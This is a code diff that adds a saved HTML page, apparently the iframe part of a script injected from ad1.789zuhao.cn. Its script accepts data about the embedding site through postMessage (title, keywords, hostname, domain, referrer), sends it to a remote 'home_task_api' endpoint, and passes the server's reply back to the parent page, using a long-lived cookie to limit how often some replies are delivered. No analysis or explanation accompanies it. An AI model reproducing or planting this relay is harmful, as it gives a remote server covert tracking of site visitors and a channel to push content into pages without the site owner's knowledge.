@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<!-- saved from url=(0033)https://ad1.789zuhao.cn/home_task -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title></title>
+</head>
+<body>
+<script src="./saved_resource" type="text/javascript"></script><script src="./cookies.js.下载"></script>
+<script>
+    var LAST_TIME = Cookies.get('LAST_TIME');
+    window.addEventListener('message', receiver, false);
+    function receiver(e) {
+        if (e.data) {
+            a(e.data);
+        }
+    }
+    function a(str){
+        var data = JSON.parse(str);
+        var port = data.port;
+        if (typeof(data.port) == "undefined")
+        {
+            port = "";
+        }
+        var sendStr='webtitle='+data.webtitle+'&keywords='+data.keywords+'&hostname='+data.hostname+'&domain='+data.domain+'&referrer='+data.referrer+'&port='+port;
+        setTimeout(function () {
+            var url = "https://ad1.789zuhao.cn/home_task_api";
+            var xmlhttp = new XMLHttpRequest();
+            xmlhttp.onreadystatechange=function(e){
+                if(xmlhttp.readyState == 4 && xmlhttp.status == 200){
+                    var res = e.target.response;
+                    res = JSON.parse(res);
+                    if(res.code == '200'){
+                         if(res.type == 3){
+                             if(typeof(LAST_TIME) == "undefined" ){
+                                 window.parent.postMessage(JSON.stringify(res), data.origin);
+                             }
+                         } else {
+                            window.parent.postMessage(JSON.stringify(res), data.origin);
+                        }
+                        Cookies.set('LAST_TIME', '34WERQW12341234SDF', { expires: 600 });
+                    }
+                }
+            };
+            xmlhttp.open('post',url,true);
+            xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+            xmlhttp.send(sendStr);
+        },0);
+    }
+</script>
+
+</body></html>
